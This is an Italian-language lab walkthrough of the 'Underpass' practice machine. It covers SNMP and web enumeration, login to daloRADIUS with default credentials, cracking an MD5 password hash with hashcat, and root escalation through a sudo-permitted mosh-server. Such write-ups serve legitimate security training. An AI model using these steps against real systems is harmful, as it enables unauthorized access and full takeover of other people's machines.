---
title: Underpass Walkthrough
description: Underpass è una macchina Linux di difficoltà Easy che presenta inizialmente una pagina predefinita di Apache su Ubuntu. Questo spinge l'attaccante a enumerare le porte UDP della macchina per identificare vettori d'attacco alternativi. L'attaccante può enumerare il servizio SNMP e scoprire che Daloradius è in esecuzione sulla macchina remota; il pannello degli operatori è accessibile utilizzando le credenziali predefinite. All'interno del pannello, è memorizzato l'hash della password per l'utente svcMosh, che è crackabile. Successivamente, l'attaccante può autenticarsi sulla macchina remota via SSH con le credenziali ottenute. L'utente svcMosh è configurato per eseguire mosdh-server come root, il che permette all'attaccante di connettersi al server dalla propria macchina locale e interagire con il sistema remoto con i privilegi di utente root.
author: dua2z3rr
date: 2025-10-12 1:00:00
categories: [Machines]
tags: ["Area di Interesse: Web Application", "Area di Interesse: Common Applications", "Vulnerabilità: Default Credentials"]
image: /assets/img/underpass/underpass-resized.png
---

## Enumerazione Esterna

### Nmap

Cominciamo con 2 scan di nmap, uno per le porte **TCP** e uno per le porte **UDP**.

TCP:
```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $sudo nmap -vv -sC -sV -p- 10.10.11.48
<SNIP>
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK+kvbyNUglQLkP2Bp7QVhfp7EnRWMHVtM7xtxk34WU5s+lYksJ07/lmMpJN/bwey1SVpG0FAgL0C/+2r71XUEo=
|   256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ8XNCLFSIxMNibmm+q7mFtNDYzoGAJ/vDNa6MUjfU91
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

UDP:

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $sudo nmap -vv -sU -sC -sV 10.10.11.48
<SNIP>
PORT     STATE         SERVICE REASON              VERSION
161/udp  open          snmp    udp-response ttl 63 SNMPv1 server; net-snmp SNMPv3 server (public)
| snmp-info: 
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: c7ad5c4856d1cf6600000000
|   snmpEngineBoots: 31
|_  snmpEngineTime: 1h45m19s
| snmp-sysdescr: Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64
|_  System uptime: 1h45m19.63s (631963 timeticks)
1812/udp open|filtered radius  no-response
1813/udp open|filtered radacct no-response
Service Info: Host: UnDerPass.htb is the only daloradius server in the basin!
```

Abbiamo trovato 3 porte **UDP**:
1. 161: **snmp**
2. 1812: **radius**
3. 1813: **radacct**

> Cos'è **radius** e **radacct**? RADIUS è un protocollo di rete per centralizzare l'autenticazione, l'autorizzazione e la contabilizzazione (AAA), mentre `radacct` è una specifica tabella di database, tipicamente utilizzata con il server **FreeRADIUS**, che memorizza i dati di accounting come l'utilizzo dell'utente, i tempi di sessione e l'utilizzo dei dati. In sostanza, RADIUS è il sistema e il processo generale, mentre `radacct` è il meccanismo di archiviazione per i registri dettagliati d'utilizzo generati dal processo di accounting di RADIUS.
{: .prompt-info }

### HTTP

Prima di cercare exploit per le varie versioni dei protocolli che abbiamo ottenuto da nmap, andiamo sulla prota 80.

![Desktop View](/assets/img/underpass/underpass-apache2.png)

Non possiamo fare nulla su questa pagina.

### SNMP

Procediamo ad enumerare SNMP, iniziando dalle community-strings.

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $onesixtyone -c /home/dua2z3rr/SecLists/Discovery/SNMP/common-snmp-community-strings.txt 10.10.11.48
Scanning 1 hosts, 120 communities
10.10.11.48 [public] Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64
10.10.11.48 [public] Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64

┌─[dua2z3rr@parrot]─[~]
└──╼ $snmpwalk -v2c -c public 10.10.11.48
iso.3.6.1.2.1.1.1.0 = STRING: "Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (849569) 2:21:35.69
iso.3.6.1.2.1.1.4.0 = STRING: "steve@underpass.htb"
iso.3.6.1.2.1.1.5.0 = STRING: "UnDerPass.htb is the only daloradius server in the basin!"
<SNIP>
```

Otteniamo la mail `steve@underpass.htb` e sappiamo che l'host sta hostando **daloradius**.

### Fuff

Ottenuta questa nuova informazione, sarebbe probabile l'esistenza un endpoint per daloradius sul sito apache. Poricediamo allora a fare fuzzing.

![Desktop View](/assets/img/underpass/underpass-daloradius-forbidden.png)

Vediamo che la directory esiste, quindi iniziamo a fare fuzzing ricorsivo di questa directory.

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $ffuf -w SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt -u http://10.10.11.48/daloradius/FUZZ -ic -recursion

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.48/daloradius/FUZZ
 :: Wordlist         : FUZZ: /home/dua2z3rr/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

                        [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 51ms]
library                 [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 65ms]
[INFO] Adding a new job to the queue: http://10.10.11.48/daloradius/library/FUZZ

doc                     [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 55ms]
[INFO] Adding a new job to the queue: http://10.10.11.48/daloradius/doc/FUZZ

app                     [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 70ms]
[INFO] Adding a new job to the queue: http://10.10.11.48/daloradius/app/FUZZ

contrib                 [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 42ms]
[INFO] Adding a new job to the queue: http://10.10.11.48/daloradius/contrib/FUZZ

ChangeLog               [Status: 200, Size: 24703, Words: 3653, Lines: 413, Duration: 57ms]
setup                   [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 69ms]
[INFO] Adding a new job to the queue: http://10.10.11.48/daloradius/setup/FUZZ

LICENSE                 [Status: 200, Size: 18011, Words: 3039, Lines: 341, Duration: 51ms]
FAQS                    [Status: 200, Size: 1428, Words: 247, Lines: 43, Duration: 51ms]
                        [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 54ms]
[INFO] Starting queued job on target: http://10.10.11.48/daloradius/library/FUZZ

                        [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 53ms]
                        [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 86ms]
```

> Questo process può prendere molto tempo anche con una wordlist piccola come quella che ho scelto. Se vuoi fare come me, e saltare questo procedimento, possiamo andar3e nella repository github di **daloradius** (<https://github.com/lirantal/daloradius>) e cercare manualmente il percorso della pagina di login.
{: .prompt-warning }

Troviamo la pagina **login.php** all'url `daloradius/app/operators/login.php` e la visitiamo.

> Esistono molteplici pagine di login. L'amministratore può accedere alla dasshboard solo se si trova nell'url corretto.
{: .prompt-warning }

![Desktop View](/assets/img/underpass/underpass-daloradius-login-page.png)

Per prima cosa, cerchiamo delle credenziali di default online che possiamo provare e, se questo non dovrebbe avere successo, abbiamo la mail che abbiamo scoperto con SNMP che potrebbe darci un nome utente valido per un eventuale bruteforce.

Ecco cosa ho ottenuto attraverso la ricerca delle credenziali di default:
> The default username and password for daloRADIUS are **administrator** and **radius**, respectively. It is crucial to change these default credentials immediately after your first successful login for security reasons.

Proviamo a loggarci con queste credenziali.

![Desktop View](/assets/img/underpass/underpass-daloradius-dashboard.png)

Siamo loggati come amministratori

### Enumerazione Dashboard

Se clicchiamo sul pulsante `Go to users lists` ci troveremo davanti l'hash dell'utente **svcMosh**

![Desktop View](/assets/img/underpass/underpass-user-list.png)

Non ci rimane che crackare l'hash.

### Hashcat

Per crackare l'hash utilizzeremo hashcat e hashid per identificare il tipo di hash.

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $hashid -m 412DD4759978ACFCC81DEAB01B382403
Analyzing '412DD4759978ACFCC81DEAB01B382403'
[+] MD2 
[+] MD5 [Hashcat Mode: 0]
[+] MD4 [Hashcat Mode: 900]
[+] Double MD5 [Hashcat Mode: 2600]
[+] LM [Hashcat Mode: 3000]
[+] RIPEMD-128 
[+] Haval-128 
[+] Tiger-128 
[+] Skein-256(128) 
[+] Skein-512(128) 
[+] Lotus Notes/Domino 5 [Hashcat Mode: 8600]
[+] Skype [Hashcat Mode: 23]
[+] Snefru-128 
[+] NTLM [Hashcat Mode: 1000]
[+] Domain Cached Credentials [Hashcat Mode: 1100]
[+] Domain Cached Credentials 2 [Hashcat Mode: 2100]
[+] DNSSEC(NSEC3) [Hashcat Mode: 8300]
[+] RAdmin v2.x [Hashcat Mode: 9900]
┌─[dua2z3rr@parrot]─[~]
└──╼ $nano hash.txt
┌─[dua2z3rr@parrot]─[~]
└──╼ $hashcat -a 0 -m 0 hash.txt rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-haswell-AMD Ryzen 7 3700X 8-Core Processor, 4283/8630 MB (2048 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 2 MB

Dictionary cache built:
* Filename..: rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 2 secs

412dd4759978acfcc81deab01b382403:underwaterfriends        
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 412dd4759978acfcc81deab01b382403
Time.Started.....: Sun Oct 12 15:06:25 2025 (2 secs)
Time.Estimated...: Sun Oct 12 15:06:27 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1295.6 kH/s (0.62ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2990080/14344385 (20.84%)
Rejected.........: 0/2990080 (0.00%)
Restore.Point....: 2981888/14344385 (20.79%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: unicornn -> uly9999
Hardware.Mon.#1..: Util: 26%

Started: Sun Oct 12 15:06:00 2025
Stopped: Sun Oct 12 15:06:28 2025
```

Abbiamo trovato la password! Loggiamoci tramite ssh all'host.

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $ssh svcMosh@10.10.11.48
The authenticity of host '10.10.11.48 (10.10.11.48)' can't be established.
ED25519 key fingerprint is SHA256:zrDqCvZoLSy6MxBOPcuEyN926YtFC94ZCJ5TWRS0VaM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.48' (ED25519) to the list of known hosts.
svcMosh@10.10.11.48's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun Oct 12 01:07:38 PM UTC 2025

  System load:  0.0               Processes:             225
  Usage of /:   51.6% of 6.56GB   Users logged in:       0
  Memory usage: 14%               IPv4 address for eth0: 10.10.11.48
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Sat Jan 11 13:29:47 2025 from 10.10.14.62
svcMosh@underpass:~$
```

Siamo dentro! Prendiamo la user flag e procediamo con la privilege escalation.

## Shell come svcMosh

### Enumerazione Interna

Eseguiamo, come al solito, il comando `sudo -l`.

```shell
svcMosh@underpass:~$ sudo -l
Matching Defaults entries for svcMosh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svcMosh may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/bin/mosh-server
```

> Mosh è una alternativa ad ssh che permette di mantenere connessioni/sessioni attive anche senza costante connessione fra i 2 host. 
{: .prompt-info }

### Privilege Escalation

Per diventare root sarà sufficiente utilizzare il comando `mosh-server` sulla macchina nemica e usare `mosh-client` sulla nostra macchina per collegarci.

> IMPORTANTE: Utilizza le porte fra la 60000 e la 61000 (**Altrimenti non riusciremo a collegarci**).
{: .prompt-danger }

```shell
svcMosh@underpass:~$ sudo /usr/bin/mosh-server new -p 60014


MOSH CONNECT 60014 qttlejiDN1U+kmxMa2Jh2w

mosh-server (mosh 1.3.2) [build mosh 1.3.2]
Copyright 2012 Keith Winstein <mosh-devel@mit.edu>
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

[mosh-server detached, pid = 2301]
```

```shell
┌─[✗]─[dua2z3rr@parrot]─[~]
└──╼ $MOSH_KEY=qttlejiDN1U+kmxMa2Jh2w mosh-client 10.10.11.48 60014
<SNIP>
 * Support:        https://ubuntu.com/pro

 System information as of Sun Oct 12 01:07:38 PM UTC 2025

  System load:  0.0               Processes:             225
  Usage of /:   51.6% of 6.56GB   Users logged in:       0
  Memory usage: 14%               IPv4 address for eth0: 10.10.11.48
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Mosh: You have a detached Mosh session on this server (mosh [2292]).


root@underpass:~# whoami
root
```

Prendiamo la root flag e terminiamo la box.
